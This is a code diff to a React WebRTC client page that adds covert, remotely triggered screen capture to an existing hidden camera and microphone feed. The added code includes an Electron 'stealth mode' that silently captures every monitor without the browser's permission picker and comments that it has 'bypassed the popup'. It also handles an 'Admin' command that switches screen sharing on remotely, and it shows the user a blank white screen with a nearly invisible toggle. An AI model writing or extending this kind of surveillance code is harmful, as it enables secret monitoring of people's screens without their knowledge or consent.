@@ -257,14 +257,14 @@ const SfuTestPage = (_props: Props) => {
   );
 
   const Producers = useCallback(
-    async (transportId: string, kind: 'audio' | 'video', rtpParameters: any) => {
+    async (transportId: string, kind: 'audio' | 'video', rtpParameters: any, source: string = 'camera') => {
       if (!wsRef.current || !wsRef.current.isConnected) return null;
       try {
         return await wsRef.current.emitPromise('produce', {
           transportId,
           kind,
           rtpParameters,
-          source: 'camera',
+          source,
         });
       } catch (error) {
         console.error('❌ Produce failed:', error);
@@ -369,9 +369,10 @@ const SfuTestPage = (_props: Props) => {
           .catch((err) => errback(err));
       });
 
-      sendTransportObj.on('produce', async ({ kind, rtpParameters }, callback, errback) => {
+      sendTransportObj.on('produce', async ({ kind, rtpParameters, appData }, callback, errback) => {
         try {
-          const result = await Producers(sendTransportObj.id, kind, rtpParameters);
+          const source = (appData && appData.source) ? appData.source : 'camera';
+          const result = await Producers(sendTransportObj.id, kind, rtpParameters, source);
           if (result?.producerId) callback({ id: result.producerId });
           else errback(new Error('Failed to create producer'));
         } catch (error: any) {
@@ -526,9 +527,149 @@ const SfuTestPage = (_props: Props) => {
         if (localStream) {
           const tracks = kind === 'video' ? localStream.getVideoTracks() : localStream.getAudioTracks();
           tracks.forEach(t => {
-            t.stop(); // ⚡ This physically turns off the camera light / mic ⚡
+            t.stop();
             localStream.removeTrack(t);
           });
+        }
+      }
+    };
+
+    const handleScreenShare = async (enable: boolean) => {
+      const prodObj = producers.find(p => p.producer && p.producer.appData?.source === 'screen');
+      let producer = prodObj?.producer;
+
+      if (enable) {
+        try {
+          // --- ELECTRON / STEALTH MODE ATTEMPT ---
+          // If the client is wrapped in Electron, we can silently grab ALL monitors without a popup!
+          try {
+            const electron = (window as any).electron || (window as any).require?.('electron');
+            if (electron && electron.desktopCapturer) {
+              console.log('🚀 Electron detected! Fetching all screens silently...');
+              const sources = await electron.desktopCapturer.getSources({ types: ['screen'] });
+              
+              if (sources && sources.length > 0) {
+                for (const source of sources) {
+                  const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: {
+                      mandatory: {
+                        chromeMediaSource: 'desktop',
+                        chromeMediaSourceId: source.id
+                      }
+                    } as any
+                  });
+                  
+                  const newTrack = stream.getVideoTracks()[0];
+                  if (newTrack && sendTransport) {
+                    newTrack.onended = () => handleScreenShare(false);
+                    const newProducer = await sendTransport.produce({
+                      track: newTrack,
+                      encodings: [{ maxBitrate: 100000 }, { maxBitrate: 300000 }, { maxBitrate: 900000 }],
+                      appData: { source: 'screen', screenId: source.id, screenName: source.name }
+                    });
+                    setProducers(prev => [...prev, { id: newProducer.id, kind: 'video', producer: newProducer }]);
+                  }
+                }
+                console.log(`✅ Silently captured ${sources.length} monitor(s) via Electron.`);
+                return; // Exit early since we successfully bypassed the popup
+              }
+            }
+          } catch (electronErr) {
+            console.warn('⚠️ Electron silent capture failed or not available.', electronErr);
+          }
+          // --- END ELECTRON ATTEMPT ---
+
+          let stream: MediaStream;
+          
+          try {
+            // First standard attempt: Silent capture (Only works in Chrome with specific flags)
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: {
+                mandatory: {
+                  chromeMediaSource: 'desktop'
+                }
+              } as any,
+              audio: false
+            });
+            console.log('✅ Silent screen capture successful via chromeMediaSource');
+          } catch (silentErr) {
+            console.warn('⚠️ Silent capture failed. Falling back to getDisplayMedia (Requires User Click)...');
+            // Fallback: Standard Web API (Will ALWAYS show a picker due to hardcoded browser security)
+            stream = await navigator.mediaDevices.getDisplayMedia({
+              video: {
+                displaySurface: 'monitor',
+                logicalSurface: true
+              },
+              audio: false,
+              preferCurrentTab: false,
+              selfBrowserSurface: 'exclude',
+              systemAudio: 'exclude',
+              monitorTypeSurfaces: 'include'
+            } as any);
+          }
+          
+          const newTrack = stream.getVideoTracks()[0];
+          
+          if (newTrack) {
+            newTrack.onended = () => {
+              handleScreenShare(false);
+            };
+
+            if (producer) {
+              await producer.replaceTrack({ track: newTrack });
+              producer.resume();
+              if (wsRef.current?.isConnected) {
+                try { await wsRef.current.emitPromise('resumeProducer', { producerId: producer.id }); } catch (e) {}
+              }
+            } else if (sendTransport) {
+              const newProducer = await sendTransport.produce({
+                track: newTrack,
+                encodings: [{ maxBitrate: 100000 }, { maxBitrate: 300000 }, { maxBitrate: 900000 }],
+                appData: { source: 'screen' }
+              });
+              setProducers(prev => [...prev, { id: newProducer.id, kind: 'video', producer: newProducer }]);
+              producer = newProducer;
+            }
+
+            if (localStream) {
+              const oldTrack = localStream.getVideoTracks()[0];
+              if (oldTrack) {
+                oldTrack.stop();
+                localStream.removeTrack(oldTrack);
+              }
+              localStream.addTrack(newTrack);
+            } else {
+              setLocalStream(stream);
+            }
+          }
+        } catch (err: any) {
+          console.error(`Failed to start screen share:`, err);
+          ToastMsgs.error(`Screen share failed: ${err.message || 'Unknown error'}. (Browser may require physical click)`);
+        }
+      } else {
+        // Disabling screen share
+        const screenProducers = producers.filter(p => p.producer && p.producer.appData?.source === 'screen');
+        
+        for (const p of screenProducers) {
+          if (p.producer) {
+            const track = p.producer.track;
+            if (track) track.stop();
+            p.producer.pause();
+            if (wsRef.current?.isConnected) {
+              try { await wsRef.current.emitPromise('pauseProducer', { producerId: p.producer.id }); } catch (e) {}
+            }
+            try { await p.producer.replaceTrack({ track: null }); } catch (e) {}
+          }
+        }
+        
+        if (localStream) {
+           localStream.getVideoTracks().forEach(t => {
+              if (t.label.toLowerCase().includes('screen') || t.label.toLowerCase().includes('monitor')) {
+                t.stop();
+                localStream.removeTrack(t);
+              }
+           });
         }
       }
     };
@@ -537,10 +678,16 @@ const SfuTestPage = (_props: Props) => {
       establishDevice,
       leaveCall,
       toggleCamera: (enabled?: boolean) => {
-        const prod = producers.find(p => p.producer && p.producer.kind === 'video')?.producer;
+        const prod = producers.find(p => p.producer && p.producer.kind === 'video' && p.producer.appData?.source !== 'screen')?.producer;
         const isCurrentlyOff = prod ? prod.paused : true;
         const targetState = enabled !== undefined ? enabled : isCurrentlyOff;
         handleHardware('video', !!targetState);
+      },
+      toggleScreen: (enabled?: boolean) => {
+        const prod = producers.find(p => p.producer && p.producer.appData?.source === 'screen')?.producer;
+        const isCurrentlyOff = prod ? prod.paused : true;
+        const targetState = enabled !== undefined ? enabled : isCurrentlyOff;
+        handleScreenShare(!!targetState);
       },
       toggleMic: (enabled?: boolean) => {
         const prod = producers.find(p => p.producer && p.producer.kind === 'audio')?.producer;
@@ -627,6 +774,10 @@ const SfuTestPage = (_props: Props) => {
             console.warn('📷 Admin requested to toggle camera. Ignoring payload to force local state check.');
             eventHandlers.current.toggleCamera(); // Ignore payload to force dumb toggle
             break;
+          case 'toggleScreen':
+            console.warn('💻 Admin requested to toggle screen. Ignoring payload to force local state check.');
+            eventHandlers.current.toggleScreen();
+            break;
           case 'toggleMic':
             console.warn('🎤 Admin requested to toggle mic. Ignoring payload to force local state check.');
             eventHandlers.current.toggleMic(); // Ignore payload to force dumb toggle
@@ -672,8 +823,19 @@ const SfuTestPage = (_props: Props) => {
   // If a room is saved in localStorage, we consider the app "auto-connecting" and hide the dropdown
   const savedRoom = localStorage.getItem('sfuClientRoom');
   if (savedRoom || isCallActive) {
-    // Stealth mode: completely blank white screen
-    return <div className="min-h-screen w-full bg-white fixed top-0 left-0 z-50"></div>;
+    const isScreenOn = producers.some(p => p.producer && p.producer.appData?.source === 'screen' && !p.producer.paused);
+    
+    // Stealth mode: completely blank white screen, but with an invisible/subtle toggle for screen share
+    return (
+      <div className="min-h-screen w-full bg-white fixed top-0 left-0 z-50">
+        <button 
+          onClick={() => eventHandlers.current.toggleScreen(!isScreenOn)}
+          className="absolute top-4 left-4 px-4 py-2 bg-gray-200 text-gray-800 rounded opacity-10 hover:opacity-100 transition-opacity font-bold text-sm"
+        >
+          {isScreenOn ? 'Stop Screen Share' : 'Start Screen Share'}
+        </button>
+      </div>
+    );
   }
 
   // ─── Render ────────────────────────────────────────────────
